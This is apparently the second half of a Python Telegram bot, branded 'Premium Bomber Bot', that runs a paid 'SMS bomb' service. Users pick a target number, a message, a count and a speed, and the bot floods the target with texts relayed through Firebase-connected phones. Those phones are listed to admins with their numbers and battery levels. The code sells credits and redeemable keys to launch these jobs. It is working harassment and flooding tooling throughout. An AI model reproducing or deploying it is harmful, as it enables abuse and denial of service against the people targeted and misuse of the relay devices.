        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        target = context.user_data["target"]
        message = context.user_data["message"]
        count = context.user_data["sms_count"]
        delay = context.user_data["delay"]

        if get_user_credits(user_id) < count:
            await update.message.reply_text("❌ Insufficient credits.")
            return ConversationHandler.END
        firebases = db_get_firebases()
        if not firebases:
            await update.message.reply_text("❌ No Firebase configured.")
            return ConversationHandler.END

        fb_ids = list(firebases.keys())
        job_id = str(uuid4())[:8]
        db_add_job(job_id, target, message, fb_ids, chat_id, count, delay, user_id)
        task = asyncio.create_task(
            execute_bomb_job(job_id, target, message, fb_ids, count, delay,
                             user_id, schedule_time))
        running_jobs[job_id] = task

        sched = (f"⏰ *Scheduled:* `{schedule_time.strftime('%Y-%m-%d %H:%M')}`"
                 if schedule_time else "🚀 *Running now...*")
        await update.message.reply_text(
            "✅ *BOMB LAUNCHED!* ✅\n" + f"{LINE}\n"
            f"📦 Job ID: `{job_id}`\n"
            f"📞 Target: `{escape_md(target)}`\n"
            f"📨 Count: {count} | ⚡ Speed: {delay}s\n"
            f"{sched}\n" + f"{LINE}\n" + "📊 Progress bar soon ✨")
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"bomb_schedule error: {e}")
        await update.message.reply_text(f"❌ Error: {escape_md(str(e))}")
        return ConversationHandler.END


async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


async def quick_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /bomb <target> <message>")
        return
    target = args[0]
    message = " ".join(args[1:])
    count = min(10, get_user_credits(user_id))
    if count == 0:
        await update.message.reply_text("❌ No credits.")
        return
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("❌ No Firebase.")
        return
    fb_ids = list(firebases.keys())
    chat_id = update.effective_chat.id
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message, fb_ids, chat_id, count, 0.1, user_id)
    task = asyncio.create_task(
        execute_bomb_job(job_id, target, message, fb_ids, count, 0.1, user_id, None))
    running_jobs[job_id] = task
    await update.message.reply_text(
        f"✅ *QUICK BOMB LAUNCHED!*\n{LINE}\n📦 Job ID: `{job_id}`")


# ==========================================================
# ---------- CALLBACK HANDLER ----------
# ==========================================================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if data == "balance":
        credits = get_user_credits(user_id)
        await query.edit_message_text(
            f"💎 *PREMIUM VAULT*\n{LINE}\n💳 Balance: *{credits}* credits\n{LINE}",
            parse_mode=ParseMode.MARKDOWN)
        return
    if data == "history":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await query.edit_message_text("📜 No jobs found yet.")
            return
        text = "📜 *PREMIUM HISTORY*\n" + f"{LINE}\n\n"
        for j in jobs:
            e = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
                 "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            text += f"{e} `{j['id']}` → {escape_md(j['target'])} *({j['status']})*\n"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
        return
    if data == "status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await query.edit_message_text("📊 No jobs yet.")
            return
        text = "📊 *STATUS REPORT*\n" + f"{LINE}\n\n"
        for j in jobs:
            e = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
                 "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            text += (f"{e} *Job:* `{j['id']}`\n"
                     f"   🎯 `{escape_md(j['target'])}`\n"
                     f"   📨 {j.get('total_sms', 0) or 0} | "
                     f"✅ {j.get('success_count', 0) or 0} | ❌ {j.get('fail_count', 0) or 0}\n"
                     f"   💳 {j.get('credit_used', 0) or 0}\n"
                     f"   📌 *{j['status']}*\n" + f"   {'─' * 29}\n")
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
        return
    if data == "check_join":
        joined, missing = await check_channel_membership(user_id, BOT)
        if joined:
            await query.edit_message_text(
                "✅ *All channels joined!*\nWelcome.", parse_mode=ParseMode.MARKDOWN)
            credits = get_user_credits(user_id)
            role = "👑 *ADMIN*" if user_id in ADMIN_IDS else "⚡ *USER*"
            await query.message.reply_text(
                "✅ *Welcome!*\n" + f"{LINE}\n"
                f"👤 `{user_id}`\n💎 {credits}\n🎖️ {role}\n"
                f"👑 {escape_md(OWNER)}",
                reply_markup=get_main_keyboard(user_id),
                parse_mode=ParseMode.MARKDOWN)
        else:
            ch_list = "\n".join(f"• {escape_md(ch)}" for ch in missing)
            await query.edit_message_text(
                f"❌ *Not joined yet!*\n\nMissing:\n{ch_list}",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.MARKDOWN)
        return
    if data == "redeem_key":
        context.user_data["awaiting_redeem"] = True
        await query.edit_message_text(
            f"🔑 *REDEEM KEY*\n{LINE}\nSend your key now.", parse_mode=ParseMode.MARKDOWN)
        return
    if data == "gen_key":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Unauthorized.")
            return
        await query.edit_message_text(
            "🔑 *GENERATE KEY*\nUse `/addkey <credits> <max_uses>`")
        return
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("⛔ Unauthorized.")
        return
    if data == "devices":
        await show_devices(query)
    elif data == "stats":
        await show_stats(query)
    elif data == "manage_fb":
        await manage_firebases(query)
    elif data == "add_fb":
        await query.edit_message_text("📝 Use `/addfb <url>`")
    elif data.startswith("fb_delete_"):
        fid = data.split("_")[2]
        db_delete_firebase(fid)
        await query.edit_message_text(f"✅ Firebase {fid} deleted.")
        await manage_firebases(query)
    elif data.startswith("fb_test_"):
        fid = data.split("_")[2]
        fb = db_get_firebases().get(fid)
        if not fb:
            await query.edit_message_text("❌ Not found.")
            return
        test = await firebase_request(fb["url"] + "?shallow=true", "GET")
        if isinstance(test, dict) and test.get("_error"):
            await query.edit_message_text(
                f"❌ Failed.\n{escape_md(test.get('message', 'Unknown'))}")
        else:
            await query.edit_message_text(f"✅ Firebase {fid} works!")
    elif data.startswith("job_cancel_"):
        job_id = data.split("_")[2]
        if job_id in running_jobs:
            running_jobs[job_id].cancel()
            del running_jobs[job_id]
            db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
            await query.edit_message_text(f"❌ Job {job_id} cancelled.")
        else:
            await query.edit_message_text("Job not running.")
    elif data == "back_main":
        await query.edit_message_text(
            "🔙 *Back to main menu.*",
            reply_markup=get_main_keyboard(user_id),
            parse_mode=ParseMode.MARKDOWN)
    else:
        await query.edit_message_text("Unknown action.")


async def show_devices(query):
    firebases = db_get_firebases()
    if not firebases:
        await query.edit_message_text("No Firebase configured.")
        return
    all_devices = []
    for fid, data in firebases.items():
        devices = await get_online_devices(data["url"])
        for d in devices:
            d["fb_id"] = fid
            all_devices.append(d)
    if not all_devices:
        await query.edit_message_text("📡 No online devices.")
        return
    text = "📡 *ONLINE DEVICES*\n" + f"{LINE}\n\n"
    for d in all_devices:
        text += (f"*{escape_md(d['name'])}* (FB: {escape_md(d['fb_id'])})\n"
                 f"🆔 `{d['id']}`\n"
                 f"📱 {escape_md(d['phone'])}\n"
                 f"🔋 {escape_md(str(d['battery']))} | {len(d['sims'])} SIM(s)\n\n")
    kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb),
                                  parse_mode=ParseMode.MARKDOWN)


async def show_stats(query):
    jobs = db_get_jobs(limit=10)
    total_jobs = len(jobs)
    completed = sum(1 for j in jobs if j["status"] == "completed")
    total_sent = sum(j.get("success_count", 0) or 0 for j in jobs)
    total_fail = sum(j.get("fail_count", 0) or 0 for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    text = (f"📊 *PREMIUM STATS*\n{LINE}\n📦 Jobs: {total_jobs}\n"
            f"✅ Completed: {completed}\n📨 SMS Sent: {total_sent}\n"
            f"📈 Rate: {rate}%\n\n*Recent:*\n")
    for j in jobs[:5]:
        e = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
             "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{e} `{j['id'][:8]}` → {escape_md(j['target'])}\n"
    kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb),
                                  parse_mode=ParseMode.MARKDOWN)


async def manage_firebases(query):
    firebases = db_get_firebases()
    text = "⚙️ *MANAGE FIREBASES*\n" + f"{LINE}\n\n"
    if not firebases:
        text += "No Firebase. Use /addfb <url>\n"
    else:
        for fid, data in firebases.items():
            text += f"• *{fid}*: `{data['url']}`\n"
    kb = []
    for fid in firebases.keys():
        kb.append([
            InlineKeyboardButton(f"Test {fid}", callback_data=f"fb_test_{fid}"),
            InlineKeyboardButton(f"Delete {fid}", callback_data=f"fb_delete_{fid}"),
        ])
    kb.append([InlineKeyboardButton("➕ Add", callback_data="add_fb")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb),
                                  parse_mode=ParseMode.MARKDOWN)


# ==========================================================
# ---------- BUTTON HANDLER ----------
# ==========================================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if text not in ["/start", "/ping"]:
        joined, missing = await check_channel_membership(user_id, context.bot)
        if not joined:
            ch_list = "\n".join(f"• {escape_md(ch)}" for ch in missing)
            await update.message.reply_text(
                f"⚠️ *Join all channels first!*\n\n{ch_list}\n\n"
                f"👑 {escape_md(OWNER)}",
                reply_markup=get_join_keyboard(), parse_mode=ParseMode.MARKDOWN)
            return

    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        if db_redeem_key(key, user_id):
            credits = get_user_credits(user_id)
            await update.message.reply_text(
                f"🎟️ *KEY REDEEMED!*\n{LINE}\n💳 Now: *{credits}* credits\n{LINE}",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid key or already used.")
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == "💣 Launch Bomb":
        await bomb_wizard_start(update, context)
    elif text == "💰 Balance":
        await balance_command(update, context)
    elif text == "📊 Status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await update.message.reply_text("📊 No jobs yet.")
            return
        out = "📊 *STATUS REPORT*\n" + f"{LINE}\n\n"
        for j in jobs:
            e = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
                 "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            out += (f"{e} *Job:* `{j['id']}`\n"
                    f"   🎯 `{escape_md(j['target'])}`\n"
                    f"   📨 {j.get('total_sms', 0) or 0} | "
                    f"✅ {j.get('success_count', 0) or 0} | ❌ {j.get('fail_count', 0) or 0}\n"
                    f"   💳 {j.get('credit_used', 0) or 0}\n"
                    f"   📌 *{j['status']}*\n" + f"   {'─' * 29}\n")
        await update.message.reply_text(out, parse_mode=ParseMode.MARKDOWN)
    elif text == "📜 History":
        await history_command(update, context)
    elif text == "🔑 Redeem Key":
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text(
            f"🔑 *REDEEM KEY*\n{LINE}\nSend your key now.", parse_mode=ParseMode.MARKDOWN)
    elif text == "📡 Online Devices" and user_id in ADMIN_IDS:
        await show_devices_msg(update)
    elif text == "📊 Stats & History" and user_id in ADMIN_IDS:
        await show_stats_msg(update)
    elif text == "⚙️ Manage Firebases" and user_id in ADMIN_IDS:
        await manage_fb_msg(update)
    elif text == "🔑 Generate Key" and user_id in ADMIN_IDS:
        await update.message.reply_text(
            "🔑 *GENERATE KEY*\nUse `/addkey <credits> <max_uses>`",
            parse_mode=ParseMode.MARKDOWN)


async def show_devices_msg(update):
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("No Firebase.")
        return
    all_devices = []
    for fid, data in firebases.items():
        devices = await get_online_devices(data["url"])
        for d in devices:
            d["fb_id"] = fid
            all_devices.append(d)
    if not all_devices:
        await update.message.reply_text("📡 No online devices.")
        return
    text = "📡 *ONLINE DEVICES*\n" + f"{LINE}\n\n"
    for d in all_devices:
        text += (f"*{escape_md(d['name'])}*\n🆔 `{d['id']}`\n"
                 f"📱 {escape_md(d['phone'])}\n🔋 {escape_md(str(d['battery']))}\n\n")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def show_stats_msg(update):
    jobs = db_get_jobs(limit=10)
    total_jobs = len(jobs)
    completed = sum(1 for j in jobs if j["status"] == "completed")
    total_sent = sum(j.get("success_count", 0) or 0 for j in jobs)
    total_fail = sum(j.get("fail_count", 0) or 0 for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    await update.message.reply_text(
        f"📊 *STATS*\n{LINE}\n📦 Jobs: {total_jobs}\n✅ Completed: {completed}\n"
        f"📨 Sent: {total_sent}\n📈 Rate: {rate}%",
        parse_mode=ParseMode.MARKDOWN)


async def manage_fb_msg(update):
    firebases = db_get_firebases()
    text = "⚙️ *MANAGE FIREBASES*\n" + f"{LINE}\n\n"
    if not firebases:
        text += "No Firebase. Use /addfb <url>\n"
    else:
        for fid, data in firebases.items():
            text += f"• *{fid}*: `{data['url']}`\n"
    text += "\n/addfb to add, /deletefb <id> to remove."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


# ==========================================================
# ---------- ERROR HANDLER ----------
# ==========================================================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    if err and "Conflict" in str(err):
        return
    if err and "Can't parse entities" in str(err):
        logger.warning(f"Markdown issue: {err}")
        return
    logger.error(f"Exception: {err}", exc_info=err)


# ==========================================================
# ---------- MAIN ----------
# ==========================================================
def main():
    global BOT
    try:
        app = Application.builder().token(TOKEN).concurrent_updates(True).build()
        BOT = app.bot
        set_bot(BOT)
        app.add_error_handler(error_handler)

        conv_handler = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(bomb_wizard_start, pattern="^bomb_wizard$"),
                CommandHandler("bomb_wizard", bomb_wizard_start),
                MessageHandler(filters.Regex("^💣 Launch Bomb$"), bomb_wizard_start),
            ],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
                MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
                SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
                SPEED: [CallbackQueryHandler(bomb_speed,
                                             pattern="^speed_(slow|medium|fast|lightning)$")],
                SCHEDULE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule)],
            },
            fallbacks=[CommandHandler("cancel", cancel_conversation)],
            allow_reentry=True,
            per_message=False,
        )
        app.add_handler(conv_handler)
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ping", ping))
        app.add_handler(CommandHandler("balance", balance_command))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("addkey", addkey_command))
        app.add_handler(CommandHandler("addcredits", addcredits_command))
        app.add_handler(CommandHandler("history", history_command))
        app.add_handler(CommandHandler("cancel", cancel_job_command))
        app.add_handler(CommandHandler("addfb", add_firebase_command))
        app.add_handler(CommandHandler("deletefb", delete_firebase_command))
        app.add_handler(CommandHandler("broadcast", broadcast_command))
        app.add_handler(CommandHandler("bomb", quick_bomb))

        app.add_handler(CallbackQueryHandler(
            callback_handler,
            pattern=("^(devices|stats|manage_fb|fb_delete_.+|fb_test_.+|job_cancel_.+|"
                     "back_main|add_fb|balance|history|redeem_key|gen_key|status|check_join)$")))

        logger.info("✅ Premium Bomber Bot started.")
        print("\n✅ Bot is running! Press Ctrl+C to stop.\n")
        app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"❌ Failed to start: {e}")
        print(f"\n❌ ERROR: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
